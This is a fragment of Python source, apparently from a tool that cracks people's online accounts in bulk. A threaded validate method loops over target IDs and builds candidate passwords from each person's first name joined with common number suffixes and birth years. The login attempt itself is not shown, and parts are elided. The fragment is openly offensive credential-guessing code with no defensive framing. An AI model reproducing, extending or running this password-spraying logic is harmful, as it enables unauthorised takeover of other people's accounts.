	...
	def validate(self):
		...
		with ThreadPoolExecutor(max_workers=35) as kirim:
			for x in self.data_id:
				...
				name = namee.split(" ")
				if(len(name[0])>=6):
					__password_list = [namee,name[0]+'123',name[0]+'1234',name[0]+'12345',name[0]+'11223344',name[0]+'12',name[0]+'123123',name[0]+'123456789',name[0]+'12345678',name[0]+'123321',name[0]+'1122334455',name[0]+'12341234',name[0]+'1990',name[0]+'1991',name[0]+'1992',name[0]+'1993',name[0]+'1994',name[0]+'1995',name[0]+'1996',name[0]+'1997',name[0]+'1998',name[0]+'1999',name[0]+'2000',name[0]+'2001',name[0]+'2002',name[0]+'2003',name[0]+'2004',name[0]+'200400',name[0]+'100200',name[0]+'5544332211',name[0]+'665544332211']
				elif(len(name[0])<=2):
					__password_list = [namee,name[0]+'123',name[0]+'1234',name[0]+'12345',name[0]+'11223344',name[0]+'12',name[0]+'123123',name[0]+'123456789',name[0]+'12345678',name[0]+'123321',name[0]+'1122334455',name[0]+'12341234',name[0]+'1980',name[0]+'1981',name[0]+'1982',name[0]+'1983',name[0]+'1984',name[0]+'1985',name[0]+'1986',name[0]+'1987',name[0]+'1988',name[0]+'1989',name[0]+'1979',name[0]+'2001',name[0]+'2002',name[0]+'2003',name[0]+'2004',name[0]+'1234@',name[0]+'1234#',name[0]+'87654321',name[0]+'987654321']
				else:
					__password_list = [namee,name[0]+'123',name[0]+'1234',name[0]+'12345',name[0]+'11223344',name[0]+'12',name[0]+'123123',name[0]+'123456789',name[0]+'12345678',name[0]+'123321',name[0]+'1122334455',name[0]+'12341234',name[0]+'1980',name[0]+'1981',name[0]+'1982',name[0]+'1983',name[0]+'1984',name[0]+'1985',name[0]+'1986',name[0]+'1987',name[0]+'1988',name[0]+'1989',name[0]+'1979',name[0]+'2001',name[0]+'2002',name[0]+'2003',name[0]+'2004',name[0]+'1234@',name[0]+'1234#',name[0]+'87654321',name[0]+'987654321']
				if add=="y":
